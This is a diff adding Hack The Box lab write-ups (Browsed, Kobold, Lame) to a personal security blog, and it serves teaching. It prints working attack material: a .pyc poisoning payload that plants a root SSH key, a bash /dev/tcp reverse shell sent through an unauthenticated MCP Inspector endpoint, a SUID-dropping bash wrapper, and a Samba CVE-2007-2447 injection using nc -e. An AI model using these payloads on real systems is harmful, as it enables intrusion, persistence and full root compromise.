+            <thead><tr><th>Offset</th><th>Size</th><th>Field</th></tr></thead>
+            <tbody>
+              <tr><td>0</td><td>4</td><td>Magic number (<code>0xcb0d0d0a</code> for Python 3.12)</td></tr>
+              <tr><td>4</td><td>4</td><td>Flags (<code>0</code> = timestamp-based invalidation)</td></tr>
+              <tr><td>8</td><td>4</td><td>Source mtime (little-endian uint32)</td></tr>
+              <tr><td>12</td><td>4</td><td>Source size (little-endian uint32)</td></tr>
+              <tr><td>16</td><td>...</td><td>Marshaled code object</td></tr>
+            </tbody>
+          </table>
+          <p>From <code>stat extension_utils.py</code>:</p>
+          <ul>
+            <li><strong>mtime:</strong> <code>2025-03-23 10:56:19 UTC</code> (epoch <code>1742727379</code>)</li>
+            <li><strong>size:</strong> <code>1245</code> bytes</li>
+          </ul>
+          <p>The malicious module plants an SSH key for root while still providing the expected <code>validate_manifest()</code> and <code>clean_temp_files()</code> functions so the tool runs cleanly:</p>
+          <pre>import os, subprocess
+
+pubkey = "ssh-ed25519 AAAA..."
+os.makedirs("/root/.ssh", mode=0o700, exist_ok=True)
+with open("/root/.ssh/authorized_keys", "a") as f:
+    f.write(pubkey + "\n")
+os.chmod("/root/.ssh/authorized_keys", 0o600)
+
+<span class="comment"># Provide expected functions so the tool doesn't crash</span>
+import json, shutil
+from jsonschema import validate, ValidationError
+...</pre>
+          <div class="callout">
+            <div class="callout-label">Note</div>
+            The <code>.pyc</code> must be compiled on the target with the target&rsquo;s Python 3.12.3 to produce a compatible marshaled code object. Compiling locally with a different Python version caused a segfault.
+          </div>
+          <pre><span class="comment"># On the target as larry:</span>
+<span class="keyword">$</span> python3.12 /tmp/gen_pyc.py
+<span class="string">[+] Written 2448 bytes to /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc</span>
+
+<span class="keyword">$</span> sudo /opt/extensiontool/extension_tool.py --ext Fontify
+<span class="string">[+] Manifest is valid.
+[-] Skipping version bumping
+[-] Skipping packaging</span></pre>
+          <p>Python loaded the poisoned <code>.pyc</code>, executing the SSH key plant as root:</p>
+          <pre><span class="keyword">$</span> ssh -i browsed_key root@10.129.244.79
+<span class="keyword">#</span> id
+<span class="string">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+
+          <div class="flag-box">&#127987; user.txt: 18743a6a8c6e560846782d46205fdc5e</div>
+          <div class="flag-box">&#127987; root.txt: 1f036d0839072a19df5af0397076e460</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Chrome extensions are full recon platforms.</strong> A Manifest V3 service worker with <code>--no-sandbox</code> Chrome can read local files via <code>file://</code>, access internal services, and exfiltrate data via <code>fetch()</code>. Any system that loads untrusted extensions is an attack surface.</li>
+            <li><strong>Bash <code>[[ -eq ]]</code> is not safe for untrusted input.</strong> Unlike <code>[ -eq ]</code>, the <code>[[ ]]</code> compound command evaluates operands as arithmetic expressions, which recursively resolve variables and execute command substitutions in array subscripts (<code>a[$(cmd)]</code>).</li>
+            <li><strong>URL path constraints shape payloads.</strong> Flask decodes <code>%2F</code> as a path separator, so payloads routed through URL paths cannot contain forward slashes.</li>
+            <li><strong>Python <code>.pyc</code> cache poisoning is viable when <code>__pycache__</code> is writable.</strong> The timestamp-based invalidation mechanism trusts the mtime embedded in the <code>.pyc</code> header. World-writable <code>__pycache__</code> directories are a privilege escalation vector.</li>
+            <li><strong>Compile <code>.pyc</code> files on the target.</strong> Python&rsquo;s marshal format varies between minor versions. A <code>.pyc</code> compiled with Python 3.11 will segfault when loaded by Python 3.12. Always compile on the target or match the exact Python version.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: Kobold -->
+      <div class="content-pane" id="post-htb-kobold">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-easy" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Easy</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.21</span>
+        </div>
+        <h1 class="post-title">Kobold &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">easy</span>
+          <span class="post-tag">mcp</span>
+          <span class="post-tag">stdio-rce</span>
+          <span class="post-tag">suid</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Kobold is a Linux box running an MCP (Model Context Protocol) server testing tool alongside a Docker management platform. Initial access comes through an unauthenticated command injection in the MCPJam Inspector&rsquo;s stdio transport, which spawns arbitrary commands server-side. Privilege escalation exploits a world-writable <code>/usr/bin/bash</code> binary &mdash; replacing it with a thin wrapper that creates a SUID copy of bash the next time root invokes it.</p>
+
+          <h2>Reconnaissance</h2>
+          <p>A full TCP scan reveals four services:</p>
+          <pre>PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
+80/tcp   open  http     nginx 1.24.0 (redirects to HTTPS)
+443/tcp  open  ssl/http nginx 1.24.0
+3552/tcp open  http     Arcane Docker Management v1.13.0 (Go/SvelteKit)</pre>
+          <p>The SSL certificate names <code>kobold.htb</code> with a wildcard SAN <code>*.kobold.htb</code>, suggesting virtual hosts. Adding <code>kobold.htb</code> to <code>/etc/hosts</code> and fuzzing the Host header discovers two additional vhosts:</p>
+          <table>
+            <thead><tr><th>Hostname</th><th>Service</th></tr></thead>
+            <tbody>
+              <tr><td><code>kobold.htb</code></td><td>Static landing page (&ldquo;Kobold Operations Suite&rdquo;)</td></tr>
+              <tr><td><code>mcp.kobold.htb</code></td><td>MCPJam Inspector &mdash; an MCP server testing tool</td></tr>
+              <tr><td><code>bin.kobold.htb</code></td><td>PrivateBin instance (found later via nginx config)</td></tr>
+            </tbody>
+          </table>
+          <p>The MCPJam Inspector immediately stands out. It&rsquo;s an open-source tool for interacting with MCP servers, and it supports multiple transport types &mdash; including <strong>stdio</strong>, which spawns a local process.</p>
+
+          <h2>Foothold &mdash; MCPJam Inspector Stdio RCE</h2>
+          <h3>The Vulnerability</h3>
+          <p>MCPJam Inspector&rsquo;s <code>/api/mcp/connect</code> endpoint accepts a stdio transport configuration that specifies a <code>command</code> and <code>args</code> to spawn as a child process. The intent is to launch a local MCP server binary for testing. The problem: <strong>there is no authentication, and there is no validation of the command being spawned.</strong></p>
+          <p>Any HTTP client can POST to this endpoint and execute arbitrary commands on the server as the user running the Inspector process (<code>ben</code>).</p>
+
+          <h3>Exploitation</h3>
+          <p>Start a listener:</p>
+          <pre><span class="keyword">$</span> nc -lvnp 9001</pre>
+          <p>Fire the RCE:</p>
+          <pre><span class="keyword">$</span> curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "serverConfig": {
+      "type": "stdio",
+      "command": "bash",
+      "args": ["-c", "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9001 0&gt;&amp;1"],
+      "env": {}
+    },
+    "serverId": "x"
+  }'</pre>
+          <p>The curl command returns an MCP connection error &mdash; ignore it. The reverse shell lands on the listener:</p>
+          <pre><span class="string">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</span></pre>
+
+          <h3>SSH Persistence</h3>
+          <p>The reverse shell is fragile. For a stable session, plant an SSH key:</p>
+          <pre><span class="comment"># On attacker: generate key and serve it</span>
+<span class="keyword">$</span> ssh-keygen -t ed25519 -f ~/.ssh/kobold_ben -N ""
+<span class="keyword">$</span> cd ~/.ssh &amp;&amp; python3 -m http.server 8888</pre>
+          <p>Via the MCPJam RCE (fire a second payload):</p>
+          <pre><span class="keyword">$</span> mkdir -p /home/ben/.ssh &amp;&amp; \
+curl -s http://ATTACKER_IP:8888/kobold_ben.pub \
+  -o /home/ben/.ssh/authorized_keys &amp;&amp; \
+chmod 700 /home/ben/.ssh &amp;&amp; \
+chmod 600 /home/ben/.ssh/authorized_keys</pre>
+          <p>Now SSH in:</p>
+          <pre><span class="keyword">$</span> ssh -i ~/.ssh/kobold_ben ben@10.129.7.164</pre>
+
+          <h2>Privilege Escalation &mdash; World-Writable Bash</h2>
+          <h3>Discovery</h3>
+          <p>Post-access enumeration reveals a critical misconfiguration:</p>
+          <pre><span class="keyword">$</span> ls -la /usr/bin/bash
+<span class="string">-rwxrwxrwx 1 root root 1446024 ... /usr/bin/bash</span></pre>
+          <p><code>/usr/bin/bash</code> is <strong>mode 0777</strong> &mdash; world-writable. Any user can replace the bash binary. Checking <code>/etc/passwd</code> confirms root&rsquo;s login shell is <code>/bin/bash</code>:</p>
+          <pre><span class="string">root:x:0:0:root:/root:/bin/bash</span></pre>
+          <p>This means: replace bash with a wrapper, wait for root to invoke it (via cron, login, or any bash-calling process), and the wrapper runs as root.</p>
+
+          <h3>The Wrapper</h3>
+          <p>Back up the real bash and deploy a wrapper:</p>
+          <pre><span class="comment"># Backup real bash</span>
+<span class="keyword">$</span> cp /usr/bin/bash /tmp/bash_orig
+
+<span class="comment"># Write the wrapper</span>
+<span class="keyword">$</span> cat &gt; /tmp/bash_wrapper &lt;&lt; 'EOF'
+#!/usr/bin/dash
+if [ "$(id -u)" = "0" ]; then
+  cp /tmp/bash_orig /tmp/rootbash 2&gt;/dev/null
+  chmod u+s /tmp/rootbash 2&gt;/dev/null
+fi
+exec /tmp/bash_orig "$@"
+EOF
+
+<span class="keyword">$</span> chmod +x /tmp/bash_wrapper</pre>
+          <p>The wrapper uses <code>/usr/bin/dash</code> as its interpreter (not bash &mdash; that would be recursive). When root executes it, it silently copies the real bash to <code>/tmp/rootbash</code> with the SUID bit set. Then it transparently calls the real bash so the caller never notices.</p>
+          <div class="callout">
+            <div class="callout-label">Note</div>
+            Deploying the wrapper requires that no running process has bash open (ETXTBSY). Use the MCPJam RCE with <code>dash</code> as the command to avoid the lock.
+          </div>
+          <pre><span class="keyword">$</span> curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "serverConfig": {
+      "type": "stdio",
+      "command": "dash",
+      "args": ["-c", "cat /tmp/bash_wrapper &gt; /usr/bin/bash &amp;&amp; chmod 755 /usr/bin/bash"],
+      "env": {}
+    },
+    "serverId": "x"
+  }'</pre>
+
+          <h3>Trigger and Root</h3>
+          <p>Once the wrapper is in place, root must execute <code>/usr/bin/bash</code> at least once. On this box, a root-level process periodically invokes bash. After a short wait:</p>
+          <pre><span class="keyword">$</span> ls -la /tmp/rootbash
+<span class="string">-rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash</span></pre>
+          <p>The SUID bit is set. Get a root shell:</p>
+          <pre><span class="keyword">$</span> /tmp/rootbash -p
+
+<span class="string">rootbash-5.2# id
+uid=1001(ben) gid=1001(ben) euid=0(root) groups=1001(ben),37(operator)
+rootbash-5.2# cat /root/root.txt
+[REDACTED]</span></pre>
+
+          <div class="flag-box">&#127987; user.txt + root.txt captured.</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>MCP Inspector stdio transport is an RCE primitive.</strong> Any MCP testing tool that exposes stdio transport over HTTP without authentication allows arbitrary command execution. The &ldquo;connection failed&rdquo; response is a red herring &mdash; the process still spawns.</li>
+            <li><strong>World-writable system binaries are instant privesc.</strong> The check is trivial: <code>find / -perm -0002 -type f 2&gt;/dev/null | grep -E '/(bin|sbin|usr)/'</code>. If a shell interpreter is writable, replace it with a SUID-dropping wrapper and wait for a privileged process to call it.</li>
+            <li><strong>Always verify file type and size, not just permissions.</strong> A 158-byte <code>/usr/bin/bash</code> is obviously not a real bash binary. Running <code>file /usr/bin/bash</code> or checking the byte count would have revealed the wrapper immediately.</li>
+            <li><strong>Persistence before enumeration.</strong> The MCPJam reverse shell was unstable. Planting an SSH key before doing anything else ensured we never lost access during the operation.</li>
+            <li><strong>Check for prior exploitation artifacts.</strong> On shared HTB instances, other players may have already deployed payloads. Files like <code>/tmp/rootbash</code> and wrapper scripts in <code>/tmp/</code> are signals that the attack has already been executed.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: Lame -->
+      <div class="content-pane" id="post-htb-lame">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-easy" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Easy</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.24</span>
+        </div>
+        <h1 class="post-title">Lame &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">easy</span>
+          <span class="post-tag">samba</span>
+          <span class="post-tag">cve-2007-2447</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Lame is an easy Linux box running several outdated services. The attack chain is straightforward: Samba 3.0.20 is vulnerable to CVE-2007-2447, a pre-authentication command injection in the username field that yields a direct root shell. No privilege escalation is needed &mdash; the exploit lands as root in a single step.</p>
+
+          <h2>Reconnaissance</h2>
+          <p>A full TCP port scan reveals five services:</p>
+          <pre>PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
+139/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
+3632/tcp open  distccd     distccd v1 (GNU 4.2.4)</pre>
+          <pre><span class="keyword">$</span> nmap -p- -sC -sV -T4 10.129.8.218</pre>
+          <p>Additional recon:</p>
+          <ul>
+            <li><strong>FTP (21):</strong> Anonymous login is allowed but the listing is empty &mdash; nothing useful.</li>
+            <li><strong>SMB (445):</strong> Null session succeeds. Shares exposed: <code>print$</code>, <code>tmp</code>, <code>opt</code>, <code>IPC$</code>, <code>ADMIN$</code>. The <code>tmp</code> share is writable. Message signing is disabled and SMB2 negotiation fails (SMB1 only).</li>
+            <li><strong>SSH (22):</strong> Very old OpenSSH. Useful for stable access after exploitation, but not a direct attack vector.</li>
+            <li><strong>distccd (3632):</strong> Distributed compiler daemon with no access restrictions. A viable fallback (CVE-2004-2687) but only yields a low-privilege shell.</li>
+          </ul>
+          <p>The version inventory tells the story immediately: Samba 3.0.20 is within the affected range for CVE-2007-2447, one of the most reliable remote root exploits for Linux SMB services. vsftpd 2.3.4 is the famously backdoored version (CVE-2011-2523), but that backdoor is frequently non-functional on HTB instances since it only affects a specific compromised binary that was distributed during a narrow window in 2011.</p>
+          <p>Samba is the clear primary target &mdash; confirmed vulnerable version, no authentication required, direct root execution.</p>
+
+          <h2>Foothold (and Root)</h2>
+          <h3>The Vulnerability: CVE-2007-2447</h3>
+          <p>Samba versions 3.0.0 through 3.0.25rc3 pass user-supplied input from MS-RPC calls directly to <code>/bin/sh</code> when external scripts (like the <code>username map script</code> configuration option) are invoked. Because the username is not sanitized, shell metacharacters in the username field are interpreted by the shell.</p>
+          <p>The primitive here is <strong>unsanitized string-to-shell passthrough</strong>. Any input that reaches <code>/bin/sh</code> without sanitization is exploitable via backticks, <code>$()</code> command substitution, semicolons, or pipes. This isn&rsquo;t just a &ldquo;Samba bug&rdquo; &mdash; it&rsquo;s the universal consequence of passing untrusted input to a shell interpreter. The fix (applied in 3.0.25) was to sanitize the input before it reaches the shell.</p>
+          <p>Critically, this happens <strong>before authentication</strong> &mdash; the username is processed for mapping before any credential check occurs. The smbd process runs as root, so command execution is as root.</p>
+
+          <h3>Exploitation</h3>
+          <p><strong>Attempt 1 &mdash; smbclient (failed):</strong></p>
+          <p>The natural first attempt is injecting a reverse shell payload into the <code>logon</code> command in smbclient:</p>
+          <pre><span class="keyword">$</span> echo 'logon "/=`nohup nc -e /bin/sh 10.10.14.91 4444`"' | smbclient //10.129.8.218/tmp --no-pass</pre>
+          <p>This fails silently. smbclient escapes shell metacharacters in the username before sending them over the wire &mdash; the backticks never reach the Samba server as raw shell characters.</p>
+          <div class="callout">
+            <div class="callout-label">Note</div>
+            The exploit requires the metacharacters to arrive <em>unescaped</em> at the server&rsquo;s MS-RPC handler. The delivery mechanism matters.
+          </div>
+          <p><strong>Attempt 2 &mdash; pysmb (success):</strong></p>
+          <p>The Python <code>pysmb</code> library sends the username string directly in the SMB protocol without local shell interpretation. This delivers the payload raw:</p>
+          <pre>from smb.SMBConnection import SMBConnection
+
+<span class="comment"># Start listener first: nc -lvnp 4444</span>
+conn = SMBConnection(
+    <span class="string">'/=`nohup nc -e /bin/bash 10.10.14.91 4444`'</span>,  <span class="comment"># injected username</span>
+    'anything',      <span class="comment"># password (irrelevant)</span>
+    'KALI',          <span class="comment"># client name</span>
+    'LAME',          <span class="comment"># server name</span>
+    use_ntlm_v2=False
+)
+conn.connect('10.129.8.218', 445)</pre>
+          <p>The backtick-wrapped command is passed to <code>/bin/sh</code> by smbd, which executes <code>nc -e /bin/bash</code> back to the attacker&rsquo;s listener. The callback arrives as root:</p>
+          <pre><span class="keyword">$</span> nc -lvnp 4444
+<span class="string">listening on [any] 4444 ...
+connect to [10.10.14.91] from (UNKNOWN) [10.129.8.218] 39152</span>
+
+<span class="keyword">$</span> id
+<span class="string">uid=0(root) gid=0(root)</span></pre>
+          <p>Both flags are immediately accessible from the root shell.</p>
+
+          <div class="flag-box">&#127987; user.txt + root.txt captured.</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>The delivery mechanism matters as much as the vulnerability.</strong> CVE-2007-2447 is trivial in principle, but smbclient&rsquo;s local escaping prevents exploitation. Understanding <em>how</em> your payload reaches the target &mdash; not just <em>what</em> the vulnerability is &mdash; determines success or failure. pysmb worked because it doesn&rsquo;t interpret the username string locally.</li>
+            <li><strong>Unsanitized input to shell interpreters is the root primitive.</strong> This vulnerability isn&rsquo;t unique to Samba &mdash; any code that passes user input to <code>/bin/sh</code> without sanitization creates the same class of bug.</li>
+            <li><strong>Pre-authentication attack surface is the highest priority.</strong> Services that process user input before authentication (like Samba&rsquo;s username mapping) offer the widest attack window.</li>
+            <li><strong>Version identification drives the entire operation.</strong> Every service on this box has a confirmed, specific version. One nmap scan immediately surfaces three CVEs with public exploits.</li>
+            <li><strong>Always have a fallback path.</strong> Even with a high-confidence primary, having distccd (CVE-2004-2687) as a known fallback for user-level access means a single failure doesn&rsquo;t stall the operation.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: DevArea (LOCKED) -->
+      <div class="content-pane" id="post-htb-devarea">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.28</span>
+        </div>
+        <h1 class="post-title">DevArea &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">active</span>
+        </div>
+        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 300px; text-align: center; padding: 3rem 2rem;">
+          <div style="font-size: 4rem; margin-bottom: 1.5rem; opacity: 0.6;">&#128274;</div>
+          <p style="font-size: 1.15rem; color: var(--text-secondary); margin-bottom: 1rem;">This writeup is locked while the box is active on HackTheBox.</p>
+          <div id="devarea-timer" style="font-family: var(--font-mono); font-size: 1.8rem; color: var(--accent); font-weight: 700; letter-spacing: 0.05em;"></div>
+        </div>
+      </div>
+
     </div><!-- /content-scroll -->
   </div><!-- /main -->
 </div><!-- /layout -->
@@ -1461,6 +2203,11 @@ const state = {
     'htb-cctv':          { label: 'CCTV',             folder: 'HTB',      dot: '#4ade80' },
     'htb-facts':         { label: 'Facts',            folder: 'HTB',      dot: '#4ade80' },
     'htb-variatype':     { label: 'VariaType',        folder: 'HTB',      dot: '#fb923c' },
+    'htb-barrier':       { label: 'Barrier',          folder: 'HTB',      dot: '#fb923c' },
+    'htb-browsed':       { label: 'Browsed',          folder: 'HTB',      dot: '#fb923c' },
+    'htb-devarea':       { label: 'DevArea',          folder: 'HTB',      dot: '#fb923c' },
+    'htb-kobold':        { label: 'Kobold',           folder: 'HTB',      dot: '#4ade80' },
+    'htb-lame':          { label: 'Lame',             folder: 'HTB',      dot: '#4ade80' },
   }
 };
 
@@ -1570,6 +2317,28 @@ document.getElementById('searchInput').addEventListener('input', function() {
     }
   });
 });
+
+// ── DEVAREA COUNTDOWN TIMER ───────────────────────
+(function() {
+  const unlockDate = new Date('2026-04-05T00:00:00Z').getTime();
+  const timerEl = document.getElementById('devarea-timer');
+  if (!timerEl) return;
+  function tick() {
+    const now = Date.now();
+    const diff = unlockDate - now;
+    if (diff <= 0) {
+      timerEl.textContent = 'Writeup available soon';
+      return;
+    }
+    const d = Math.floor(diff / 86400000);
+    const h = Math.floor((diff % 86400000) / 3600000);
+    const m = Math.floor((diff % 3600000) / 60000);
+    const s = Math.floor((diff % 60000) / 1000);
+    timerEl.textContent = 'Unlocks in: ' + d + 'd ' + h + 'h ' + m + 'm ' + s + 's';
+  }
+  tick();
+  setInterval(tick, 1000);
+})();
 
 // ── INIT ──────────────────────────────────────────
 renderTabs();
